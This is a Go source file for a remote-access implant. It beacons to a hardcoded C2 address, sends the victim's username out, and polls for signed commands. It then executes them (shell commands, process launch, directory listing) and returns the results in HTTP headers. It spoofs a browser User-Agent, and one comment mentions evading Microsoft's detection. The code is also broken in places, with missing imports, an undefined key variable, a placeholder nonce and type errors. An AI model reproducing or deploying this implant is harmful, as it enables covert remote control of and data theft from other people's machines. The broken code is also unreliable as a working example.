package main

import (
	"crypto"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/hex"
	"encoding/pem"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"strings"
	"time"
	"uuid"

	"golang.org/x/crypto/chacha20poly1305"
)

func encryptMessage(key, plaintext []byte) ([]byte, []byte, error) {
	nonce := make([]byte, chacha20poly1305.NonceSizeX)
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, nil, err
	}

	cipher, err := chacha20poly1305.NewX(key)
	if err != nil {
		return nil, nil, err
	}

	ciphertext := cipher.Seal(nil, nonce, plaintext, nil)
	return ciphertext, nonce, nil
}

func decryptMessage(key, ciphertext, nonce []byte) ([]byte, error) {
	cipher, err := chacha20poly1305.NewX(key)
	if err != nil {
		return nil, err
	}

	plaintext, err := cipher.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return nil, err
	}

	return plaintext, nil
}

func terminal(command string) (res string) {
	toRun := exec.Command(command)
	out, _ := toRun.Output()

	res = string(out)
	return
}

func readDir(path string) (contents string) {
	files, _ := os.ReadDir(path)

	for _, file := range files {
		contents += file.Name()
		contents += ", "
	}
	fmt.Printf(contents)
	return
}

func runCommand(path string) (PID string) {
	//cmdToRun := path
	//args := nil
	procAttr := new(os.ProcAttr)
	procAttr.Files = []*os.File{os.Stdin, os.Stdout, os.Stderr}
	if process, err := os.StartProcess(path, nil, procAttr); err != nil {

	} else {
		PID = string(process.Pid)
	}
	return
}

func getCurrentDir() (mydir string) {
	mydir, err := os.Getwd()
	if err != nil {
		fmt.Println(err)
	}
	return
}

func getCurrentUser() (name string) {
	user, err := user.Current()
	if err != nil {
		fmt.Printf(err.Error())
	}
	name = user.Username
	return
}

func main() {
	nonce := []byte{...}
	const key =	"12345678901234567890123456789012"	
	const pubKeyPEM = "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA4pz/Qsw7oDtdwT857JcsGU4KWHFi+OgnFbK02BwF82mlESwn9znXldI9guEYW476XvgfMTNP0reGxle+BmIn+AujJ/QF7gQtZ2W/QCZPaOK2sbphRNfaY4zlb8qLrCvsZ4K5SGpyY7U/skyF1lPIW1Og6N+HY8+eSG9xzzGl/SfAjaIhyBT1g94jFtZty9NYXNevdLwdU8OhU1/IzmQU2jG225vZgF0lvbkrVgTLV+iVKqQt1NsLqh141II6UEqZuEHvKtuclbJLTxKSF2uNBCPILDhv8zIqq0K6368hQ8P7FAPoQK96pjx4UwviMG+RSZfa/T7h5tKJNM3cVz3NTwIDAQAB\n-----END PUBLIC KEY-----"
	PEMBlock, _ := pem.Decode([]byte(pubKeyPEM))
	if PEMBlock == nil {
		log.Fatal("Could not parse Public Key PEM")
	}
	if PEMBlock.Type != "PUBLIC KEY" {
		log.Fatal("Found wrong key type")
	}
	pubkey, _ := x509.ParsePKIXPublicKey(PEMBlock.Bytes)

	// to do
	// set the pubkey to be generated through the builder app, same with uuid

	uuidWithHyphen := uuid.New()
	uuid := strings.Replace(uuidWithHyphen.String(), "-", "", -1)
	// Construct the client for requests, we define nothing right now but in the future can add functionality
	client := http.Client{}

	result := getCurrentUser()
	toSend := string(result)
	toSend = strings.Replace(toSend, "\n", "", -1)
	fmt.Printf(toSend)

	//time.Sleep(10)
	req, err := http.NewRequest("GET", "http://192.168.1.179:8000/", nil)
	req.Header = http.Header{"APPSESSIONID": {uuid}, "Res": {toSend}, "User-Agent": {"Chromium 110"}}
	resp, err := client.Do(req)

	if err != nil {
		panic(err)
	}

	defer resp.Body.Close()

	// Here we need to add the functionality for sending the results of command execution and go into a loop of waiting for something, then executing, then repeating [all done]
	for true {
		// current issue is that we're not retrieving and executing the new ocmmand
		req, err = http.NewRequest("GET", "http://192.168.1.179:8000/session", nil)
		req.Header.Add("APPSESSIONID", uuid)
		resp, err = client.Do(req)
		body, err := ioutil.ReadAll(resp.Body)
		//body = string(body)
		//fmt.Printf(body)
		statusC := resp.Status
		if err != nil {
			log.Fatalln(err)
		}

		//Convert the body to type string
		esb := string(body)
		// we need to decrypt the body now

		sb,_ := decryptMessage(Key, esb, nonce)

		for sb == "0" {
			time.Sleep(2 * time.Second)
			req, err = http.NewRequest("GET", "http://192.168.1.179:8000/session", nil)
			req.Header.Add("APPSESSIONID", uuid)
			resp, err = client.Do(req)
			body, err := ioutil.ReadAll(resp.Body)
			if err != nil {
				log.Fatalln(err)
			}
			sb = string(body)
		}
		// After verifying we have a command to execute, we now need to grab the commands signature
		// This is stored in a header value of the request
		sig := resp.Header.Get("Verifier")
		fmt.Printf(sig + "\n")
		// This is trying to fix the issue of getting 500 status codes
		// when the DB is cleared
		//
		//statusC = string(statusC)
		fmt.Printf(statusC)
		fmt.Printf("\n")
		for statusC == "'500'" {
			time.Sleep(2 * time.Second)
			req, err = http.NewRequest("GET", "http://192.168.1.179:8000/session", nil)
			req.Header.Add("APPSESSIONID", uuid)
			resp, err = client.Do(req)
			body, err := ioutil.ReadAll(resp.Body)
			if err != nil {
				log.Fatalln(err)
			}
			sb = string(body)
			statusC = resp.Status
		}
		fmt.Printf(sb + "\n")

		// We reassign the string body to a new variable because otherwise Microsoft picks up that we're passing an HTML request right to be executed
		//sb1 := strings.Replace(sb, "\n", "", -1) // we get the command back with a \n which fucks up execution, strip it with this
		sb1 := strings.Split(sb, " ")
		command := sb[1:]

		h := sha256.New()
		h.Write([]byte(sb))
		// After verifying we have a command to execute, we now need to grab the commands signature
		// This is stored in a header value of the request
		rawSignature := resp.Header.Get("Verifier")
		signature, _ := hex.DecodeString(rawSignature)
		err = rsa.VerifyPKCS1v15(pubkey.(*rsa.PublicKey), crypto.SHA256, h.Sum(nil), signature)
		if err != nil {
			// if error is not nil, retry getting the command
			time.Sleep(2 * time.Second)
			req, _ = http.NewRequest("GET", "http://192.168.1.179:8000/session", nil)
			req.Header.Add("APPSESSIONID", uuid)
			resp, _ = client.Do(req)
			body, _ := ioutil.ReadAll(resp.Body)
			sb = string(body)
		}

		// We are turning this into a switch statement
		// We need to append the results of these functions to the result string
		// Then we send it
		switch sb1[0] {
		case "pwd":
			result = getCurrentDir()
		case "gcu":
			result = getCurrentUser()
		case "rc":
			result = runCommand(command)
		case "rd":
			result = readDir(sb1[1])
		case "terminal":
			result = terminal(sb)
		}

		toSend := string(result)
		fmt.Printf(toSend)
		toSend = strings.Replace(toSend, "\n", "", -1)
		fmt.Printf(toSend)

		time.Sleep(2 * time.Second)
		req, err = http.NewRequest("GET", "http://192.168.1.179:8000/schema", nil)
		req.Header = http.Header{"APPSESSIONID": {uuid}, "Res": {toSend}, "User-Agent": {"testing testing"}}
		resp, err = client.Do(req)
		if err != nil {
			panic(err)
		}
		defer resp.Body.Close()
	}

}